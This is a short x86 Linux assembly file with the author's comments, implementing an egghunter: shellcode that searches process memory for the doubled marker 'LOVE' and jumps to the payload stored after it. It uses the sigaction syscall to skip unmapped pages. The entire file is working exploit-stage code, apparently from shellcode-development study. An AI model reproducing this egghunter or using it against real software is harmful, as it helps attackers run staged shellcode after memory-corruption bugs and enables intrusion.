global _start ; Hi linker we are going to use _start as entry point of program
section .text

_start: ; entry point of program
xor	ecx, ecx		;Empty Ecx for using it as a counter
letme_allign:
or	cx, 0x0fff		;Allign page
in_add:
	inc	ecx		; Address + 1
	push	0x43		; SIGACTION sys call
	pop	eax		
	int	0x80		; Calling Interrupt 
check_efault:
	cmp	al, 0xf2	; Compare that we get EFAULT for ecx or not
	jz	letme_allign	; if flag is set to zero then goto letme_allign and setup page allignment
search_tag:
	mov	eax, 0x4c4f5645 ; tag/egg string in eax for comparison (LOVE->0x4c4f5645)
	mov	edi, ecx	; edi conatins address of ecx
	scasd			; Read about scasd instruction (here eax and edi value is checked)
	jnz	in_add		; if it doesnt match then go to in_add 
	scasd			; 2nd scasd is used for specific reason of uniqueness of the string 
	jnz	in_add		; If it doesnt matches then goto in_Ad again
	jmp	edi		; Finally found yeah ! Execute my shellcode now !! ;) 
